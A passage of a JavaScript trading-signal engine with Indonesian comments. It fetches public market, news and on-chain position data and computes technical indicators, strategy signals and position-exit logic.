        { id: 'tpfx', name: 'TPFx', category: 'FOREX_ID', catLabel: 'Forex Nasional (BAPPEBTI)', currency: 'USD', endpoint: 'https://bridge.tpfx.co.id/mt5/v1', authType: 'TPFx MT5 Bridge', needsAccountId: true, assetClass: 'FOREX', defaultBalUsd: 0 },
        { id: 'ibkr', name: 'Interactive Brokers', category: 'STOCK_FOREX_INTL', catLabel: 'Saham & Forex Internasional', currency: 'USD', endpoint: 'https://localhost:5000/v1/api', authType: 'IBKR Client Portal OAuth', needsAccountId: true, assetClass: 'STOCK', defaultBalUsd: 0 }
    ];
    const EXCHANGE_BY_ID = {}; EXCHANGE_CATALOG.forEach(e => EXCHANGE_BY_ID[e.id] = e);

    let brain = null, cycleTimer = null, tickTimer = null, cogTimer = null, nextCycleAt = 0;

    function defaultBayesianMatrix() {
        const mat = {};
        QB_STRAT_IDS.forEach(id => {
            mat[id] = {
                TREND_UP: { alpha: 2, beta: 2 },
                TREND_DOWN: { alpha: 2, beta: 2 },
                RANGING: { alpha: 2, beta: 2 }
            };
        });
        return mat;
    }

    function defaultBrain() {
        const w = {}; QB_STRAT_IDS.forEach(id => w[id] = 1.0);
        return {
            v: 1, gen: 0, cycles: 0, firstBootAt: Date.now(), running: false,
            optCursor: 0, scanCursor: 0, lastOptAt: 0, autoExecBursa: false,
            engineV: 2, // v2: mesin exit bersama backtest/live, biaya+slippage, champion terkoreksi, Bayesian hanya dari live
            params: { atrMult: 1.8, rsiLongMax: 62, rsiShortMin: 38, minScore: 75, feeBps: 10, slipBps: 5, riskPct: 1.0, tp1Ratio: 0.8, volConfirmMult: 1.15 },
            learned: { atrMult: 1.8, rsiLongMax: 62, rsiShortMin: 38, tp1Ratio: 0.8, volConfirmMult: 1.15 },
            weights: w,
            bayesian: defaultBayesianMatrix(),
            lastHurst: 0.58,
            leaderboard: {}, signals: [], journal: [],
            accuracyHistory: [], equityR: 0,
            stats: { closed: 0, wins: 0, losses: 0, be: 0, tp1Hits: 0, newsIngested: 0, lessons: 0, backtests: 0, netR: 0, peakEquity: 0, maxDrawdown: 0, consecutiveLosses: 0, defensiveMode: false, backtestOOS: { trades: 0, netR: 0, winRatePct: null } },
            news: { fetchedAt: 0, items: [], perCoin: {}, breaker: [], fearGreed: null },
            derivatives: {},
            whale: { fetchedAt: 0, bias: {}, positions: [] },
            learnLog: [],
            champion: qbEmptyChampion()
        };
    }

    function loadBrain() {
        try {
            const raw = localStorage.getItem(QB_STORE);
            if (!raw) return defaultBrain();
            const b = safeJsonParse(raw, null);
            if (!b) return defaultBrain();
            const d = defaultBrain();
            if (b.engineV !== 2) {
                // Migrasi sekali jalan: statistik lama dihitung dengan engine lama (tanpa biaya penuh, exit berbeda,
                // Bayesian terhitung berulang dari backtest). Buang supaya tidak menyesatkan engine baru.
                b.leaderboard = {};
                b.bayesian = defaultBayesianMatrix();
                b.weights = Object.assign({}, d.weights);
                b.champion = qbEmptyChampion();
                b.learnLog = [];
                if (b.params && [55, 60, 65, 70].includes(b.params.minScore)) b.params.minScore = 75; // nilai hasil auto-turun lama
                b.engineV = 2;
            }
            const mergedWeights = Object.assign({}, d.weights, b.weights || {});
            const mergedBayes = Object.assign({}, d.bayesian, b.bayesian || {});
            return Object.assign(d, b, {
                params: Object.assign(d.params, b.params || {}),
                learned: Object.assign(d.learned, b.learned || {}),
                weights: mergedWeights,
                bayesian: mergedBayes,
                stats: Object.assign(d.stats, b.stats || {}),
                news: Object.assign(d.news, b.news || {}),
                whale: Object.assign(d.whale, b.whale || {}),
                champion: b.champion || d.champion
            });
        } catch (e) { return defaultBrain(); }
    }
    function saveBrain() { try { localStorage.setItem(QB_STORE, JSON.stringify(brain)); } catch (e) { } }

    /* ═══════════════ 2. DATA LAYER (100% RIIL — TANPA DATA PALSU) ═══════════════ */
    async function fetchTimeout(url, ms) {
        return fetch(url, { signal: AbortSignal.timeout ? AbortSignal.timeout(ms || 9000) : undefined });
    }
    async function qbFetchBinanceKlines(sym, interval, limit, startTime) {
        limit = limit || 1000;
        let u = `https://fapi.binance.com/fapi/v1/klines?symbol=${sym}&interval=${interval}&limit=${Math.min(1500, limit)}`;
        if (startTime) u += `&startTime=${Math.floor(startTime)}`;
        const r = await fetchTimeout(u, 12000);
        if (!r.ok) throw new Error('binance ' + r.status);
        const raw = await r.json();
        return raw.map(k => ({ t: k[0], o: +k[1], h: +k[2], l: +k[3], c: +k[4], v: +k[5] }));
    }
    async function qbFetchBinanceDeep(sym, interval, target) {
        target = target || 4000;
        const out = []; let startTime = null; let pages = 0;
        while (out.length < target && pages < 6) {
            pages++;
            const rem = Math.min(1500, target - out.length);
            let u = `https://fapi.binance.com/fapi/v1/klines?symbol=${sym}&interval=${interval}&limit=${rem}`;
            if (startTime) u += `&startTime=${startTime}`;
            const r = await fetchTimeout(u, 15000);
            if (!r.ok) break;
            const raw = await r.json();
            if (!Array.isArray(raw) || !raw.length) break;
            const batch = raw.map(k => ({ t: k[0], o: +k[1], h: +k[2], l: +k[3], c: +k[4], v: +k[5] }));
            const lastT = out.length ? out[out.length - 1].t : -1;
            const filtered = batch.filter(b => b.t > lastT);
            if (!filtered.length) break;
            out.push(...filtered);
            if (raw.length < rem) break;
            startTime = raw[raw.length - 1][0] + 1;
        }
        return out.length > 100 ? out.slice(-Math.min(target, out.length)) : out;
    }
    function qbParseYahooChart(j) {
        const res = j && j.chart && j.chart.result && j.chart.result[0];
        if (!res) return null;
        const ts = res.timestamp || [], q = res.indicators.quote[0];
        const out = [];
        for (let i = 0; i < ts.length; i++) {
            if (q.open[i] == null || q.close[i] == null) continue;
            out.push({ t: ts[i] * 1000, o: +q.open[i], h: +(q.high[i] || q.close[i]), l: +(q.low[i] || q.close[i]), c: +q.close[i], v: +(q.volume[i] || 0) });
        }
        return out.length > 260 ? out.slice(-1000) : null;
    }
    async function qbFetchYahoo(sym) {
        const target = `https://query1.finance.yahoo.com/v8/finance/chart/${encodeURIComponent(sym)}?range=6mo&interval=1h`;
        try {
            const r = await fetchTimeout(target, 9000);
            if (r.ok) { const parsed = qbParseYahooChart(await r.json()); if (parsed) return parsed; }
        } catch (e) { }
        try {
            const r = await fetchTimeout('https://corsproxy.io/?url=' + encodeURIComponent(target), 8000);
            if (r.ok) { const parsed = qbParseYahooChart(await r.json()); if (parsed) return parsed; }
        } catch (e) { }
        try {
            const r = await fetchTimeout('https://api.allorigins.win/raw?url=' + encodeURIComponent(target), 8000);
            if (r.ok) { const parsed = qbParseYahooChart(await r.json()); if (parsed) return parsed; }
        } catch (e) { }
        throw new Error('yahoo offline: ' + sym);
    }
    async function qbFetchCandles(asset, deep) {
        if (asset.src === 'yahoo') return qbFetchYahoo(asset.sym);
        return deep ? qbFetchBinanceDeep(asset.sym, '1h', 4000) : qbFetchBinanceKlines(asset.sym, '1h', 1000);
    }
    async function qbFetchFunding(sym) {
        try {
            const r = await fetchTimeout(`https://fapi.binance.com/fapi/v1/premiumIndex?symbol=${sym}`, 6000);
            const j = await r.json(); return { rate: parseFloat(j.lastFundingRate || 0), mark: parseFloat(j.markPrice || 0) };
        } catch (e) { return null; }
    }
    async function qbFetchOIHist(sym) {
        try {
            const r = await fetchTimeout(`https://fapi.binance.com/futures/data/openInterestHist?symbol=${sym}&period=1h&limit=25`, 6000);
            const j = await r.json();
            if (Array.isArray(j) && j.length > 5) {
                const first = +j[0].sumOpenInterest, last = +j[j.length - 1].sumOpenInterest;
                return { now: last, chgPct: first > 0 ? ((last - first) / first) * 100 : 0 };
            }
        } catch (e) { }
        return null;
    }

    const TOP_WHALES = [
        '0x37b81ab9e3ab04b9e3738e4891621205aaa31fd5',
        '0x08c14b32c8a48894e4b933090ebcc9ce33b21135',
        '0xfdf891f2b214a4c9374d26595ec6d4080262e381',
        '0x03ef8f736498047c3349bb2c18311d1bb4a79054'
    ];
    async function qbWhaleCycle() {
        const outBias = {}; const outPos = [];
        for (const addr of TOP_WHALES) {
            try {
                const r = await fetch('https://api.hyperliquid.xyz/info', {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ type: 'clearinghouseState', user: addr }),
                    signal: AbortSignal.timeout ? AbortSignal.timeout(10000) : undefined
                });
                if (!r.ok) continue;
                const data = await r.json();
                const acct = parseFloat((data.crossMarginSummary || {}).accountValue || 1000000);
                (data.assetPositions || []).forEach(p => {
                    const pos = p.position || {};
                    const sz = parseFloat(pos.szi || 0);
                    if (sz === 0) return;
                    const coin = pos.coin;
                    const entry = parseFloat(pos.entryPx || 0);
                    const val = Math.abs(sz * entry);
                    const pct = acct > 0 ? (val / acct) * 100 : 5;
                    const side = sz > 0 ? 'LONG' : 'SHORT';
                    const w = Math.min(20, Math.max(5, pct));
                    if (!outBias[coin]) outBias[coin] = 0;
                    outBias[coin] += (side === 'LONG' ? w : -w);
                    outPos.push({ whale: addr.slice(0, 8), coin, side, pct: Math.round(pct * 100) / 100, lev: (pos.leverage || {}).value || 5 });
                });
            } catch (e) { }
        }
        Object.keys(outBias).forEach(c => { outBias[c] = Math.round(outBias[c] * 100) / 100; });
        brain.whale.bias = outBias;
        brain.whale.positions = outPos.slice(0, 40);
        brain.whale.fetchedAt = Date.now();
        saveBrain();
    }

    const QB_FEEDS = [
        { name: 'CoinDesk', url: 'https://www.coindesk.com/arc/outboundfeeds/rss/' },
        { name: 'CoinTelegraph', url: 'https://cointelegraph.com/rss' },
        { name: 'Decrypt', url: 'https://decrypt.co/feed' }
    ];
    async function qbFetchFeed(feed) {
        try {
            const r = await fetchTimeout('https://api.rss2json.com/v1/api.json?rss_url=' + encodeURIComponent(feed.url), 10000);
            if (r.ok) {
                const j = await r.json();
                if (j.status === 'ok' && Array.isArray(j.items) && j.items.length) {
                    return j.items.slice(0, 15).map(it => ({
                        source: feed.name,
                        title: sanitizeInputStrict((it.title || '').trim()),
                        link: sanitizeUrlStrict(it.link || ''),
                        pubDate: it.pubDate || '',
                        summary: sanitizeInputStrict(String(it.description || '').replace(/<[^>]*>?/g, ' ').slice(0, 220))
                    }));
                }
            }
        } catch (e) { }
        try {
            const r2 = await fetchTimeout('https://api.allorigins.win/raw?url=' + encodeURIComponent(feed.url), 8000);
            if (r2.ok) {
                const txt = await r2.text();
                const doc = new DOMParser().parseFromString(txt, 'text/xml');
                const items = [...doc.querySelectorAll('item')].slice(0, 15);
                if (items.length) return items.map(it => ({
                    source: feed.name,
                    title: sanitizeInputStrict((it.querySelector('title') || {}).textContent || ''),
                    link: sanitizeUrlStrict((it.querySelector('link') || {}).textContent || ''),
                    pubDate: (it.querySelector('pubDate') || {}).textContent || '',
                    summary: sanitizeInputStrict(((it.querySelector('description') || {}).textContent || '').replace(/<[^>]*>?/g, ' ').slice(0, 220))
                }));
            }
        } catch (e) { }
        return null;
    }

    /* ═══════════════ 3. ADVANCED QUANT MATH: KALMAN FILTER, HURST EXPONENT & INDICATORS ═══════════════ */
    function emaSeries(v, p) {
        const out = new Array(v.length).fill(null); if (v.length < p) return out;
        const k = 2 / (p + 1); let e = 0;
        for (let i = 0; i < p; i++) e += v[i]; e /= p; out[p - 1] = e;
        for (let i = p; i < v.length; i++) { e = v[i] * k + e * (1 - k); out[i] = e; }
        return out;
    }
    function rsiSeries(c, p) {
        p = p || 14; const out = new Array(c.length).fill(null); if (c.length < p + 1) return out;
        let ag = 0, al = 0;
        for (let i = 1; i <= p; i++) { const d = c[i] - c[i - 1]; if (d > 0) ag += d; else al -= d; }
        ag /= p; al /= p;
        out[p] = al === 0 ? 100 : 100 - 100 / (1 + ag / al);
        for (let i = p + 1; i < c.length; i++) {
            const d = c[i] - c[i - 1]; const g = d > 0 ? d : 0, l = d < 0 ? -d : 0;
            ag = (ag * (p - 1) + g) / p; al = (al * (p - 1) + l) / p;
            out[i] = al === 0 ? 100 : 100 - 100 / (1 + ag / al);
        }
        return out;
    }
    function atrSeries(k, p) {
        p = p || 14; const out = new Array(k.length).fill(null); if (k.length < p + 1) return out;
        const trs = [0];
        for (let i = 1; i < k.length; i++) {
            trs.push(Math.max(k[i].h - k[i].l, Math.abs(k[i].h - k[i - 1].c), Math.abs(k[i].l - k[i - 1].c)));
        }
        let a = 0; for (let i = 1; i <= p; i++) a += trs[i]; a /= p; out[p] = a;
        for (let i = p + 1; i < k.length; i++) { a = (a * (p - 1) + trs[i]) / p; out[i] = a; }
        return out;
    }
    function bbSeries(c, p, m) {
        p = p || 20; m = m || 2; const up = [], mid = [], lo = [], w = [], sdArr = [];
        for (let i = 0; i < c.length; i++) {
            if (i < p - 1) { up.push(null); mid.push(null); lo.push(null); w.push(null); sdArr.push(null); continue; }
            let s = 0; for (let j = i - p + 1; j <= i; j++) s += c[j]; const sm = s / p;
            let va = 0; for (let j = i - p + 1; j <= i; j++) va += (c[j] - sm) * (c[j] - sm);
            const sd = Math.sqrt(va / p);
            up.push(sm + m * sd); mid.push(sm); lo.push(sm - m * sd); w.push(sm > 0 ? (2 * m * sd) / sm : null); sdArr.push(sd);
        }
        return { up, mid, lo, w, sd: sdArr };
    }
    function macdSeries(c) {
        const e12 = emaSeries(c, 12), e26 = emaSeries(c, 26);
        const line = c.map((_, i) => (e12[i] != null && e26[i] != null) ? e12[i] - e26[i] : null);
        const valid = line.filter(x => x != null);
        const sigValid = emaSeries(valid, 9);
        const sig = new Array(c.length).fill(null);
        let vi = 0;
        for (let i = 0; i < c.length; i++) if (line[i] != null) { sig[i] = sigValid[vi]; vi++; }
        const hist = c.map((_, i) => (line[i] != null && sig[i] != null) ? line[i] - sig[i] : null);
        return { line, sig, hist };
    }
    function sma(v, i, p) { if (i + 1 < p) return null; let s = 0; for (let j = i - p + 1; j <= i; j++) s += v[j]; return s / p; }

    /* 1D Kalman Filter Dynamic State & Velocity Estimator (Zero-Lag Fair Value) */
    function kalmanSeries(c, processVar, measVar) {
        const Q = processVar || 1e-4, R = measVar || 1e-2;
        const state = new Array(c.length).fill(null);
        const vel = new Array(c.length).fill(0);
        if (!c.length) return { state, vel };
        let x = c[0], p = 1.0, prevX = c[0];
        state[0] = x;
        for (let i = 1; i < c.length; i++) {
            const pPred = p + Q;
            const K = pPred / (pPred + R);
            x = x + K * (c[i] - x);
            p = (1 - K) * pPred;
            state[i] = x;
            vel[i] = x - prevX;
            prevX = x;
        }
        return { state, vel };
    }

    /* Hurst Exponent (H) Rescaled-Range (R/S) Fractal Market Classifier */
    function computeHurstExponent(c, endIdx, windowLen) {
        const N = windowLen || 64;
        const end = endIdx != null ? endIdx : c.length - 1;
        if (end < N + 2) return 0.50;
        const rets = [];
        for (let i = end - N + 1; i <= end; i++) {
            if (c[i - 1] > 0 && c[i] > 0) rets.push(Math.log(c[i] / c[i - 1]));
        }
        if (rets.length < 16) return 0.50;
        const mean = rets.reduce((a, b) => a + b, 0) / rets.length;
        let cum = 0, maxDev = -Infinity, minDev = Infinity, sqSum = 0;
        for (let i = 0; i < rets.length; i++) {
            const d = rets[i] - mean;
            cum += d;
            if (cum > maxDev) maxDev = cum;
            if (cum < minDev) minDev = cum;
            sqSum += d * d;
        }
        const R = maxDev - minDev;
        const S = Math.sqrt(sqSum / rets.length);
        if (S <= 1e-12 || R <= 1e-12) return 0.50;
        const H = Math.log(R / S) / Math.log(rets.length);
        return Math.max(0.20, Math.min(0.85, Math.round(H * 100) / 100));
    }

    function buildIndicators(k) {
        const c = k.map(x => x.c);
        const bb = bbSeries(c, 20, 2);
        const kalman = kalmanSeries(c, 0.0005, 0.008);
        const hurst = computeHurstExponent(c, c.length - 2, 64);
        return {
            c, k,
            ema20: emaSeries(c, 20), ema50: emaSeries(c, 50), ema200: emaSeries(c, Math.min(200, Math.floor(c.length / 2))),
            rsi: rsiSeries(c, 14), atr: atrSeries(k, 14), bb,
            macd: macdSeries(c),
            kalman, hurst,
            volSma20: k.map((_, i) => sma(k.map(x => x.v), i, 20))
        };
    }

    function detectRegime(ind, i) {
        const n = 20; if (i < n + 5 || ind.ema50[i] == null) return 'UNKNOWN';
        const c = ind.c;
        let net = Math.abs(c[i] - c[i - n]), sum = 0;
        for (let j = i - n + 1; j <= i; j++) sum += Math.abs(c[j] - c[j - 1]);
        const er = sum > 0 ? net / sum : 0;
        const ws = ind.bb.w.slice(Math.max(0, i - 200), i + 1).filter(x => x != null);
        const cur = ind.bb.w[i]; let pct = 50;
        if (ws.length > 30 && cur != null) pct = (ws.filter(x => x <= cur).length / ws.length) * 100;
        const slope = (c[i] - c[i - 30]) / (ind.atr[i] * 30 || 1);
        if (pct > 88) return 'CHAOS';
        if (er > 0.32 && slope > 0.1) return 'TREND_UP';
        if (er > 0.32 && slope < -0.1) return 'TREND_DOWN';
        return 'RANGING';
    }

    function computeMomentumBurst(ind, i) {
        if (!ind || !ind.k || !ind.k[i] || i < 25 || !ind.atr[i]) return { active: false, dir: null, strength: 0, volRatio: 1, bodyRatio: 0, roc3: 0 };
        const c = ind.c, bar = ind.k[i], o = bar.o, h = bar.h, l = bar.l, v = bar.v;
        const atr = ind.atr[i] || 1;
        const range = Math.max(1e-8, h - l);
        const bodyRatio = Math.abs(c[i] - o) / range;
        const volRatio = (ind.volSma20 && ind.volSma20[i] > 0) ? (v / ind.volSma20[i]) : 1;
        const roc3 = ((c[i] - c[i - 3]) / Math.max(1e-8, c[i - 3])) * 100;
        const roc12 = ((c[i] - c[i - 12]) / Math.max(1e-8, c[i - 12])) * 100;
        const kv = (ind.kalman && ind.kalman.vel && ind.kalman.vel[i] != null) ? (ind.kalman.vel[i] / atr) : 0;
        const isBullImpulse = c[i] > o && roc3 > 0.35 && roc12 > 0.6 && volRatio >= 1.35 && bodyRatio >= 0.55 && kv >= 0.10;
        const isBearImpulse = c[i] < o && roc3 < -0.35 && roc12 < -0.6 && volRatio >= 1.35 && bodyRatio >= 0.55 && kv <= -0.10;
        const active = isBullImpulse || isBearImpulse;
        const dir = isBullImpulse ? 'LONG' : isBearImpulse ? 'SHORT' : null;
        const strength = active ? Math.min(100, Math.round((volRatio * 25) + (bodyRatio * 35) + (Math.abs(kv) * 40))) : 0;
        return { active, dir, strength, volRatio: +volRatio.toFixed(2), bodyRatio: +bodyRatio.toFixed(2), roc3: +roc3.toFixed(2) };
    }

    // Easley, Lopez de Prado & O'Hara (2012) VPIN (Volume-Synchronized Probability of Informed Trading) & Order-Flow Imbalance (OBI)
    function computeVpinAndObi(ind, i) {
        if (!ind || !ind.k || i < 20) return { vpin: 0.28, obi: 0, toxic: false, slicingMode: "DIRECT_MARKET" };
        let sumAbsImb = 0, sumSignedImb = 0, sumVol = 0;
        const start = Math.max(1, i - 19);
        for (let j = start; j <= i; j++) {
            const bar = ind.k[j];
            if (!bar) continue;
            const v = Math.max(1e-8, bar.v || 1);
            const rng = Math.max(1e-8, (bar.h - bar.l) || Math.abs(bar.c - bar.o) || 1e-4);
            // Bulk Volume Classification (BVC) buy fraction approximation
            const z = Math.max(-3, Math.min(3, ((bar.c - bar.o) / rng) * 2.5));
            const buyFrac = 1 / (1 + Math.exp(-1.702 * z));
            const vBuy = v * buyFrac;
            const vSell = v - vBuy;
            sumAbsImb += Math.abs(vBuy - vSell);
            sumSignedImb += (vBuy - vSell);
            sumVol += v;
        }
        const vpin = sumVol > 0 ? Math.min(0.99, Math.max(0.05, sumAbsImb / sumVol)) : 0.28;
        const obi = sumVol > 0 ? Math.max(-1, Math.min(1, sumSignedImb / sumVol)) : 0;
        const toxic = vpin > 0.72;
        const slicingMode = vpin > 0.52 ? "TWAP_3X_MICRO_SLICE" : "DIRECT_MARKET";
        return { vpin: +vpin.toFixed(3), obi: +obi.toFixed(3), toxic, slicingMode };
    }

    /* ═══════════════ 4. 10-STRATEGY LIBRARY (BUKU + AI PERUSAHAAN BESAR) ═══════════════ */
    function swingLows(k, from, to) {
        const out = [];
        for (let i = Math.max(2, from); i <= to - 2 && i < k.length - 2; i++) {
            if (k[i].l < k[i - 1].l && k[i].l < k[i - 2].l && k[i].l < k[i + 1].l && k[i].l < k[i + 2].l) out.push(i);
        }
        return out.slice(-3);
    }
    function swingHighs(k, from, to) {
        const out = [];
        for (let i = Math.max(2, from); i <= to - 2 && i < k.length - 2; i++) {
            if (k[i].h > k[i - 1].h && k[i].h > k[i - 2].h && k[i].h > k[i + 1].h && k[i].h > k[i + 2].h) out.push(i);
        }
        return out.slice(-3);
    }
    function aggEma(ind, period, mult) {
        const step = mult || 4, out = new Array(ind.c.length).fill(null);
        const closes4 = []; const idxMap = [];
        for (let i = 0; i < ind.c.length; i++) {
            if (i % step === step - 1) { closes4.push(ind.c[i]); idxMap.push(i); }
        }
        if (closes4.length < period) return out;
        const e = emaSeries(closes4, period);
        idxMap.forEach((origIdx, j) => { out[origIdx] = e[j]; });
        for (let i = 1; i < out.length; i++) if (out[i] == null && out[i - 1] != null) out[i] = out[i - 1];
        return out;
    }

    const QB_EVAL = {
        elder(ind, i) {
            if (i < 220) return null;
            const e4h = QB_STATE.ema4h, e20 = ind.ema20[i], rsi = ind.rsi[i], px = ind.c[i];
            if (!e4h || e4h[i] == null || e20 == null || rsi == null) return null;
            if (px > e4h[i] && rsi >= 45 && rsi <= 62 && px <= e20 * 1.01 && px > e20 * 0.985)
                return { side: 'LONG', note: 'Pullback ke EMA20 1H searah tren 4H (Layar 2 Elder), RSI ' + rsi.toFixed(0) };
            if (px < e4h[i] && rsi <= 55 && rsi >= 38 && px >= e20 * 0.99 && px < e20 * 1.015)
                return { side: 'SHORT', note: 'Pullback rally ke EMA20 melawan tren 4H bearish, RSI ' + rsi.toFixed(0) };
            return null;
        },
        donchian(ind, i) {
            if (i < 60) return null;
            const k = ind.k, look = 20;
            let hh = -Infinity, ll = Infinity;
            for (let j = i - look; j < i; j++) { hh = Math.max(hh, k[j].h); ll = Math.min(ll, k[j].l); }
            const volOk = ind.volSma20[i] != null && k[i].v > 1.2 * ind.volSma20[i];
            if (k[i].c > hh && volOk) return { side: 'LONG', note: 'Breakout Donchian-20 + volume ' + (k[i].v / (ind.volSma20[i] || 1)).toFixed(1) + 'x (Williams/Steidlmayer)' };
            if (k[i].c < ll && volOk) return { side: 'SHORT', note: 'Breakdown Donchian-20 + volume ' + (k[i].v / (ind.volSma20[i] || 1)).toFixed(1) + 'x (Williams/Steidlmayer)' };
            return null;
        },
        bbrev(ind, i) {
            if (i < 60) return null;
            const px = ind.c[i], rsi = ind.rsi[i];
            if (ind.bb.up[i] == null || rsi == null) return null;
            if (px <= ind.bb.lo[i] * 1.004 && rsi < 30) return { side: 'LONG', note: 'Touch Lower BB + RSI ' + rsi.toFixed(0) + ' oversold (mean reversion)' };
            if (px >= ind.bb.up[i] * 0.996 && rsi > 70) return { side: 'SHORT', note: 'Touch Upper BB + RSI ' + rsi.toFixed(0) + ' overbought (mean reversion)' };
            return null;
        },
        wyckoff(ind, i) {
            if (i < 50) return null;
            const k = ind.k;
            let ll = Infinity, hh = -Infinity;
            for (let j = i - 25; j < i - 2; j++) { ll = Math.min(ll, k[j].l); hh = Math.max(hh, k[j].h); }
            const volOk = ind.volSma20[i] != null && k[i].v > 1.15 * ind.volSma20[i];
            if (k[i].l < ll && k[i].c > ll && volOk) return { side: 'LONG', note: 'WYCKOFF SPRING: sweep bawah range lalu reclaim + volume' };
            if (k[i].h > hh && k[i].c < hh && volOk) return { side: 'SHORT', note: 'WYCKOFF UPTHRUST: sweep atas range lalu reject + volume' };
            return null;
        },
        rsidiv(ind, i) {
            if (i < 60) return null;
            const k = ind.k, rsi = ind.rsi[i];
            if (rsi == null) return null;
            const lows = swingLows(k, i - 45, i - 3), highs = swingHighs(k, i - 45, i - 3);
            if (lows.length >= 2 && k[lows[1]].l < k[lows[0]].l && ind.rsi[lows[1]] > ind.rsi[lows[0]] + 2 && rsi < 48)
                return { side: 'LONG', note: 'Bullish RSI divergence: harga lower-low, momentum higher-low' };
            if (highs.length >= 2 && k[highs[1]].h > k[highs[0]].h && ind.rsi[highs[1]] < ind.rsi[highs[0]] - 2 && rsi > 52)
                return { side: 'SHORT', note: 'Bearish RSI divergence: harga higher-high, momentum lower-high' };
            return null;
        },
        macdm(ind, i) {
            if (i < 60) return null;
            const h0 = ind.macd.hist[i], h1 = ind.macd.hist[i - 1];
            if (h0 == null || h1 == null || ind.ema20[i] == null || ind.ema50[i] == null) return null;
            if (h1 <= 0 && h0 > 0 && ind.ema20[i] > ind.ema50[i]) return { side: 'LONG', note: 'MACD histogram flip positif dalam tren EMA bullish' };
            if (h1 >= 0 && h0 < 0 && ind.ema20[i] < ind.ema50[i]) return { side: 'SHORT', note: 'MACD histogram flip negatif dalam tren EMA bearish' };
            return null;
        },
        smc(ind, i) {
            if (i < 60) return null;
            const k = ind.k;
            let hh = -Infinity, ll = Infinity;
            for (let j = i - 33; j < i - 4; j++) { hh = Math.max(hh, k[j].h); ll = Math.min(ll, k[j].l); }
            const body = Math.abs(k[i].c - k[i].o), range = k[i].h - k[i].l || 1;
            const rejection = body / range < 0.45;
            const volOk = ind.volSma20[i] != null && k[i].v > 1.1 * ind.volSma20[i];
            if (k[i].h > hh && k[i].c < hh && rejection && volOk) return { side: 'SHORT', note: 'SMC Swing-Failure Pattern: sweep liquidity atas, wick reject + volume' };
            if (k[i].l < ll && k[i].c > ll && rejection && volOk) return { side: 'LONG', note: 'SMC Swing-Failure Pattern: sweep liquidity bawah, wick reject + volume' };
            return null;
        },
        statarb(ind, i) {
            // D.E. Shaw / Ernest Chan Z-Score Mean Reversion + 2nd-Derivative Deceleration
            if (i < 60) return null;
            const mid = ind.bb.mid[i], sd = ind.bb.sd ? ind.bb.sd[i] : null, rsi = ind.rsi[i];
            if (!mid || !sd || sd <= 0 || rsi == null) return null;
            const zPrev = (ind.c[i - 1] - mid) / sd;
            const zNow = (ind.c[i] - mid) / sd;
            const d1 = ind.c[i] - ind.c[i - 1], d0 = ind.c[i - 1] - ind.c[i - 2];
            if ((zPrev < -1.8 && zNow > zPrev && ind.k[i].c > ind.k[i].o) || (zNow <= -0.65 && rsi <= 42 && d0 < 0 && d1 > d0))
                return { side: 'LONG', note: 'D.E. Shaw Z-Score (' + zNow.toFixed(2) + ' sigma) mean-reversion deceleration (RSI ' + rsi.toFixed(0) + ')' };
            if ((zPrev > 1.8 && zNow < zPrev && ind.k[i].c < ind.k[i].o) || (zNow >= 0.65 && rsi >= 58 && d0 > 0 && d1 < d0))
                return { side: 'SHORT', note: 'D.E. Shaw Z-Score (+' + zNow.toFixed(2) + ' sigma) mean-reversion deceleration (RSI ' + rsi.toFixed(0) + ')' };
            return null;
        },
        tsmom(ind, i) {
            // AQR Capital / Citadel Volatility-Scaled Time-Series Momentum
            if (i < 70) return null;
            const c = ind.c, atr = ind.atr[i];
            if (!atr || atr <= 0 || !ind.ema20[i] || !ind.ema50[i]) return null;
            const ret24 = (c[i] - c[i - 24]) / (atr * Math.sqrt(24));
            const volOk = ind.volSma20[i] != null && ind.k[i].v > 1.15 * ind.volSma20[i];
            if (ret24 > 1.65 && ind.ema20[i] > ind.ema50[i] && ind.rsi[i] >= 52 && ind.rsi[i] <= 66 && volOk)
                return { side: 'LONG', note: 'AQR TSMOM t-stat +' + ret24.toFixed(2) + ' sigma + vol-scaled breakout' };
            if (ret24 < -1.65 && ind.ema20[i] < ind.ema50[i] && ind.rsi[i] <= 48 && ind.rsi[i] >= 34 && volOk)
                return { side: 'SHORT', note: 'AQR TSMOM t-stat ' + ret24.toFixed(2) + ' sigma + vol-scaled breakdown' };
            return null;
        },
        emax(ind, i) {
            if (i < 60) return null;
            const a = ind.ema20[i - 1], b = ind.ema50[i - 1], a2 = ind.ema20[i], b2 = ind.ema50[i];
            if (a == null || b == null || a2 == null || b2 == null) return null;
            if (a <= b && a2 > b2) return { side: 'LONG', note: 'EMA20/50 golden cross (baseline kontrol)' };
            if (a >= b && a2 < b2) return { side: 'SHORT', note: 'EMA20/50 death cross (baseline kontrol)' };
            return null;
        }
    };
    const QB_STATE = { ema4h: null };

    /* ═══════════════ 5. SATU MESIN EKSEKUSI UNTUK BACKTEST & LIVE ═══════════════
       Aturan exit yang SAMA dipakai backtest (runLeg) dan evaluasi sinyal live (qbEvaluateOpenSignals):
       - SL awal = atrMult x ATR; TP1 = tp1Ratio R (50% ditutup, SL ke breakeven); runner trailing 2x ATR; TP3 = 2.5R (3.2R saat momentum burst)
       - Asumsi terburuk bila beberapa level tersentuh dalam satu bar; gap melewati SL diisi di harga open
       - Biaya fee + slippage dipotong dari SETIAP trade (termasuk exit breakeven) */
    const QB_TP2_R = 1.6, QB_TP3_R = 2.5, QB_TP3_R_BURST = 3.2, QB_SLIP_BPS_DEFAULT = 5;

    function qbCostR(entry, risk, feeBps, slipBps) {
        if (!(risk > 0) || !(entry > 0)) return 0;
        return ((2 * (feeBps || 0) + 2 * (slipBps || 0)) / 10000) * entry / risk;
    }

    function qbOpenPosition(side, entry, atr, atrMult, tp1Ratio, tp3R) {
        const d = side === 'LONG' ? 1 : -1;
        const risk = atrMult * atr;
        return {
            side, entry, risk, atr,
            slInit: entry - d * risk, sl: entry - d * risk,
            tp1: entry + d * tp1Ratio * risk, tp2: entry + d * QB_TP2_R * risk, tp3: entry + d * tp3R * risk,
            tp1Hit: false, lockedR: 0
        };
    }

    // Satu langkah per bar. Mengembalikan null (posisi masih terbuka) atau { r, reason } dengan r = R kotor sebelum biaya.
    function qbStepPosition(pos, bar) {
        const L = pos.side === 'LONG';
        const rAt = px => (L ? px - pos.entry : pos.entry - px) / pos.risk;
        const adverseTouch = lvl => L ? bar.l <= lvl : bar.h >= lvl;
        const favorReach = lvl => L ? bar.h >= lvl : bar.l <= lvl;
        const stopFill = () => L ? Math.min(pos.sl, bar.o) : Math.max(pos.sl, bar.o);
        if (!pos.tp1Hit) {
